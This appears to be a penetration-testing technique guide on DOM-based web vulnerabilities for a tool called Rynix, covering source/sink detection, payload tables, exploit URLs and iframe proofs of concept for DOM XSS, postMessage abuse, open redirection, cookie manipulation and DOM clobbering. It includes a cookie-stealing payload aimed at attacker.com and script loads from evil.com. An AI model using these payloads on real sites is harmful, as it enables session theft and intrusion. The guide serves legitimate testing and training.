---
id: PS-DOM
category: DOM-based vulnerabilities
wstg_refs: [WSTG-CLNT-01, WSTG-CLNT-02]
lab_count: 7
---

# DOM-Based Vulnerabilities: Attack Technique Reference

## 1. Detection

### 1A. Source/Sink Analysis

DOM-based vulnerabilities occur when JavaScript reads attacker-controllable data from a **source** and passes it to a dangerous **sink** that supports dynamic code execution or DOM manipulation.

**Manual detection process:**

1. Inject a unique canary string (e.g., `DOMCANARY12345`) into every source (URL parameters, hash fragment, referrer)
2. Open browser DevTools (Ctrl+Shift+I) and search the DOM (Ctrl+F) for the canary string
3. If found in the DOM, identify which sink placed it there and what context surrounds it
4. For JavaScript sinks (eval, setTimeout), use DevTools Sources tab (Ctrl+Shift+F) to search all scripts for the source variable
5. Set breakpoints on identified sinks and trace the data flow from source to sink

**Automated detection:**

- browser-debug plugin (Rynix http_probe session built-in): Automatically tests sources and identifies sinks as you browse
- Enable browser-debug plugin via http_probe's embedded browser settings
- It injects canary values into all sources and monitors sink invocations

**Browser encoding differences:**

- Chrome, Firefox, Safari: URL-encode `location.search` and `location.hash` (blocks some payloads)
- IE11, pre-Chromium Edge: Do NOT URL-encode these properties (more exploitable)

### 1B. Quick Source Audit

Search JavaScript source code for references to these properties. Each one is a potential entry point for attacker data:

```javascript
// Search regex for sources
/location\.(search|hash|href|pathname)|document\.(URL|documentURI|baseURI|referrer|cookie)|window\.name|localStorage|sessionStorage|postMessage|IndexedDB/g
```

### 1C. Quick Sink Audit

Search JavaScript source code for these dangerous functions. Each one can execute or render attacker data:

```javascript
// Search regex for sinks
/\.innerHTML|\.outerHTML|document\.write|document\.writeln|eval\(|setTimeout\(|setInterval\(|Function\(|\.src\s*=|\.href\s*=|\.action\s*=|location\s*=|location\.assign|location\.replace|window\.open|jQuery|\.html\(|\$\(|\.attr\(/g
```

## 2. Sources Reference

Sources are JavaScript properties that accept attacker-controllable data. Ordered by exploitation frequency:

| Source | Example | Notes |
|--------|---------|-------|
| `location.search` | `?param=PAYLOAD` | Most common; URL-encoded in modern browsers |
| `location.hash` | `#PAYLOAD` | Not sent to server; URL-encoded in modern browsers |
| `location.href` | Full URL | Contains entire URL including query and hash |
| `document.URL` | Full URL | Alias for `location.href` in most browsers |
| `document.documentURI` | Full URL | Similar to `document.URL` |
| `document.baseURI` | Base URL | Can be influenced via `<base>` tag injection |
| `document.referrer` | Previous page URL | Attacker controls if they link to target |
| `document.cookie` | Cookie values | Exploitable if cookies set from attacker input |
| `window.name` | Window name property | Persists across navigations; attacker sets via `window.open` |
| `localStorage` / `sessionStorage` | Stored key-value pairs | Exploitable if stored data is attacker-controllable |
| `postMessage` data | `event.data` | Cross-origin messages; no origin validation = exploitable |
| `history.pushState` / `replaceState` | State object | Rare; exploitable if state is read and rendered |

## 3. Sinks Reference

Sinks are functions or properties that can cause security impact when receiving attacker data. Grouped by vulnerability type:

### 3A. XSS Sinks (Code/HTML Execution)

| Sink | Context | Payload Strategy |
|------|---------|-----------------|
| `document.write()` | HTML context | Break out of existing tag, inject `<script>` or event handler |
| `document.writeln()` | HTML context | Same as `document.write()` |
| `innerHTML` | HTML context | `<img>` / `<svg>` with event handlers (script tags do NOT execute) |
| `outerHTML` | HTML context | Same constraints as `innerHTML` |
| `eval()` | JavaScript context | Direct JS execution; break out of string with `'; payload //` |
| `setTimeout(string)` | JavaScript context | Same as `eval()` when first argument is a string |
| `setInterval(string)` | JavaScript context | Same as `eval()` when first argument is a string |
| `new Function(string)` | JavaScript context | Creates function from string; direct code execution |
| `element.insertAdjacentHTML()` | HTML context | Same constraints as `innerHTML` |

### 3B. Redirection Sinks

| Sink | Payload |
|------|---------|
| `location = input` | `javascript:alert(1)` or `https://evil.com` |
| `location.href = input` | Same as above |
| `location.assign(input)` | Same as above |
| `location.replace(input)` | Same as above |
| `window.open(input)` | Same as above |

### 3C. Resource Injection Sinks

| Sink | Payload |
|------|---------|
| `element.src = input` | Load attacker-controlled script/image |
| `element.href = input` | `javascript:` protocol for XSS |
| `element.action = input` | Form submission to attacker server |
| `element.setAttribute('onclick', input)` | Direct event handler injection |

### 3D. jQuery-Specific Sinks

| Sink | Context | Payload Strategy |
|------|---------|-----------------|
| `$(input)` | Selector/HTML creation | If input starts with `<`, jQuery creates HTML elements |
| `.html(input)` | innerHTML equivalent | Same constraints as `innerHTML` |
| `.append(input)` | DOM insertion | Same constraints as `innerHTML` |
| `.attr('href', input)` | Attribute context | `javascript:alert(1)` for `href` attributes |
| `.attr('onclick', input)` | Event handler | Direct JS execution |

### 3E. AngularJS Sinks

| Sink | Context | Payload Strategy |
|------|---------|-----------------|
| `{{ expression }}` in `ng-app` scope | Template expression | `{{constructor.constructor('alert(1)')()}}` |
| `$eval(input)` | AngularJS expression evaluation | Direct expression execution |

## 4. Techniques

### 4A. DOM XSS via document.write

When `document.write()` receives user input, the attacker can inject arbitrary HTML including script elements.

**Identifying the context:**

The payload depends on what `document.write()` is writing. If it writes inside an existing element or attribute, you must first break out of that context.

**Payloads:**

```
# Direct injection (no enclosing context)
"><script>alert(1)</script>
"><img src=1 onerror=alert(1)>

# Breaking out of an img src attribute written by document.write
" onload="alert(1)
"><svg onload=alert(1)>

# Breaking out of a select element context
</select><img src=1 onerror=alert(1)>

# Inside a string concatenation
";alert(1)//
```

**Example vulnerable pattern:**

```javascript
var query = location.search.substring(1);
document.write('<img src="/images/tracker.gif?query=' + query + '">');
```

**Exploit URL:** `https://target.com/?"><svg onload=alert(1)>`

> Lab refs: PS-DOM-01 through PS-DOM-03 cover document.write variants via web messages

### 4B. DOM XSS via innerHTML

The `innerHTML` sink does NOT execute `<script>` tags in modern browsers. Use event-handler-based payloads instead.

**Payloads:**

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><img src=x onerror=alert(1)>
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```

**Example vulnerable pattern:**

```javascript
var search = new URLSearchParams(location.search).get('q');
document.getElementById('results').innerHTML = 'Search results for: ' + search;
```

**Exploit URL:** `https://target.com/?q=<img src=x onerror=alert(document.domain)>`

### 4C. DOM XSS via jQuery Sinks

**jQuery `$()` selector with hashchange event:**

When jQuery processes user-controlled input as a selector, and the input contains HTML, jQuery creates DOM elements.

```javascript
// Vulnerable pattern
$(location.hash.slice(1));
// or
$(window.location.hash);
```

**Exploitation via iframe (triggers hashchange on victim site):**

```html
<iframe src="https://target.com/#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

**jQuery `.attr()` with `javascript:` protocol:**

```javascript
// Vulnerable pattern
$('#backLink').attr("href", new URLSearchParams(location.search).get('returnUrl'));
```

**Exploit URL:** `https://target.com/?returnUrl=javascript:alert(document.domain)`

**jQuery `.html()` sink:**

```javascript
// Vulnerable pattern
$('#output').html(userInput);
```

**Payloads:** Same as innerHTML payloads above.

### 4D. DOM XSS via Web Messages (postMessage)

When a page listens for `message` events and passes `event.data` to a sink without validating the origin, an attacker can send malicious messages from an iframe.

**Identifying the vulnerability:**

Search for event listeners:
```javascript
// Search for message handlers
/addEventListener\s*\(\s*['"]message['"]/g
```

Check if the handler:
1. Validates `event.origin` — if not, it's exploitable cross-origin
2. Passes `event.data` to a dangerous sink (innerHTML, eval, location, document.write)

**Exploitation template (postMessage to innerHTML):**

```html
<iframe src="https://target.com/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(1)>','*')">
```

**Exploitation template (postMessage to location via JSON.parse):**

```html
<iframe src="https://target.com/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(1)\"}","*")'>
```

**Exploitation template (postMessage to eval):**

```html
<iframe src="https://target.com/" onload="this.contentWindow.postMessage('alert(document.cookie)','*')">
```

**Key considerations:**
- The second argument to `postMessage()` in the exploit should be `'*'` to allow any origin
- The iframe must load the vulnerable page first, then send the message via `onload`
- If the handler checks `event.origin`, try `null` origin via sandboxed iframe

> Lab refs: PS-DOM-01, PS-DOM-02, PS-DOM-03

### 4E. DOM-Based Open Redirection

When user-controllable data flows to a navigation sink (location, location.href, location.assign, location.replace, window.open).

**Example vulnerable pattern:**

```javascript
var goto = location.hash.slice(1);
if (goto.startsWith('https:')) {
  location = goto;
}
```

**Bypass the `startsWith('https:')` check:**

```
https://target.com/#https://evil.com
```

**Other redirection payloads:**

```
# javascript: protocol (if no protocol validation)
javascript:alert(1)

# Data URI (if no protocol validation)
data:text/html,<script>alert(1)</script>

# Protocol-relative URL
//evil.com

# Backslash bypass (some parsers)
https://evil.com\@target.com
```

**Common vulnerable patterns to search for:**

```javascript
location = userInput;
location.href = userInput;
location.assign(userInput);
location.replace(userInput);
window.open(userInput);
```

> Lab refs: PS-DOM-04

### 4F. DOM-Based Cookie Manipulation

When user-controllable data is written to `document.cookie`, the attacker can inject cookie values that persist and may be read by vulnerable scripts later (stored DOM XSS via cookies).

**Example vulnerable pattern:**

```javascript
document.cookie = 'lastPage=' + location.href;
```

**Exploitation (inject a cookie value that triggers XSS when read):**

If another script reads the cookie and writes it to innerHTML:

```javascript
// Step 1: Set malicious cookie via URL
// URL: https://target.com/product?name=<img src=x onerror=alert(1)>

// Step 2: On next page load, the cookie value is read and rendered
document.getElementById('lastVisited').innerHTML = getCookie('lastPage');
```

**Exploitation via iframe (self-contained):**

```html
<iframe src="https://target.com/product?name=<img src=x onerror=alert(1)>" onload="if(!window.x)this.src='https://target.com/';window.x=1;">
```

This loads the page to set the cookie, then reloads to trigger the XSS when the cookie is read.

> Lab refs: PS-DOM-05

### 4G. DOM Clobbering

DOM clobbering injects HTML elements whose `id` or `name` attributes overwrite JavaScript global variables or object properties, hijacking application logic.

**How it works:**

When JavaScript uses the pattern:
```javascript
var someObject = window.someObject || {};
```

An attacker can inject HTML to make `window.someObject` reference a DOM element:
```html
<a id=someObject href="https://evil.com/malicious.js">
```

Now `window.someObject` is the anchor element, and `someObject.href` returns the attacker URL.

**Clobbering nested properties with anchor collections:**

Two anchors with the same `id` create a DOM collection. The `name` attribute on one of them becomes a named property of the collection:

```html
<a id=someObject><a id=someObject name=url href=//evil.com/evil.js>
```

This clobbers `someObject.url` to return `//evil.com/evil.js`. If the application uses `someObject.url` as a script source, attacker code loads.

**Clobbering `attributes` property to bypass filters:**

```html
<form onclick=alert(1)><input id=attributes>Click me
```

This overwrites the `attributes` property of the form element with the input element. Sanitizers that iterate `element.attributes` break because the clobbered value has no `length` property.

**Clobbering with `form` + `input` for deeper nesting:**

```html
<form id=x><input name=y value=clobbered>
```

Now `x.y.value` returns `"clobbered"`.

**Common clobberable targets:**
- `window.defaultConfig`
- `window.globalSettings`
- Any global variable set via `var x = window.x || {}`
- Properties checked via `if (obj.property)` without `hasOwnProperty`

> Lab refs: PS-DOM-06, PS-DOM-07

## 5. Source-Sink Mapping Table

| Vulnerability Type | Common Sources | Dangerous Sinks |
|-------------------|---------------|-----------------|
| DOM XSS | `location.search`, `location.hash`, `document.referrer`, `postMessage`, `window.name` | `innerHTML`, `document.write`, `eval()`, `$()`, `.html()`, `setTimeout(string)` |
| Open Redirection | `location.hash`, `location.search`, URL parameters | `location`, `location.href`, `location.assign()`, `window.open()` |
| Cookie Manipulation | `location.href`, URL parameters | `document.cookie` |
| Link Manipulation | URL parameters, `postMessage` | `element.href`, `element.src`, `element.action` |
| WebSocket Poisoning | URL parameters | `new WebSocket(input)` |
| DOM Clobbering | Injected HTML (stored or reflected) | `window.x \|\| {}` patterns, `element.attributes` |

## 6. Testing Methodology

### 6A. Automated Approach

1. Enable browser-debug plugin via http_probe's embedded browser
2. Browse all application pages — browser-debug plugin automatically tests sources
3. Review findings: each identified source-to-sink flow
4. Confirm exploitability by crafting context-specific payloads

### 6B. Manual Approach (Per Endpoint)

**Step 1: Source identification**
- Inject canary `XYZDOM123` into all URL parameters, hash fragment, and referrer
- Search DOM (Ctrl+F in Elements tab) for the canary
- Search all JS files (Ctrl+Shift+F in Sources tab) for the canary

**Step 2: Sink tracing**
- For each source reference found in JS, trace the data flow to identify which sink it reaches
- Set breakpoints before sink calls and inspect the value being passed
- Use `Object.defineProperty` to monitor property access:

```javascript
Object.defineProperty(Object.prototype, 'transport_url', {
  set: function(val) { debugger; this._transport_url = val; },
  get: function() { return this._transport_url; }
});
```

**Step 3: Context-specific payload selection**
- If sink is `innerHTML`: use `<img src=x onerror=alert(1)>`
- If sink is `document.write`: use `"><script>alert(1)</script>` or break out of context
- If sink is `eval/setTimeout/setInterval`: use `';alert(1)//` or `\`;alert(1)//`
- If sink is `location/href/src`: use `javascript:alert(1)`
- If sink is jQuery `$()`: use `<img src=x onerror=alert(1)>` via hashchange
- If sink is AngularJS template: use `{{constructor.constructor('alert(1)')()}}`

**Step 4: Validation**
- Confirm the payload executes (alert fires, or callback to attacker server observed)
- Document the full source-to-sink taint flow
- Record the exploit URL as a reproducible curl/browser command

### 6C. postMessage Testing Checklist

1. Search for `addEventListener('message'` in all JS files
2. Check if `event.origin` is validated — if not, cross-origin exploitation is possible
3. Identify what sink receives `event.data`
4. Create an attacker page with iframe + postMessage PoC
5. Test payloads matching the sink type (HTML for innerHTML, JS for eval, URL for location)
## Rynix workflow

1. `get_technique_guide` for `dom-based` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `list_frontend_routes`, `browser-debug plugin`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `list_frontend_routes`
- `browser-debug plugin`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

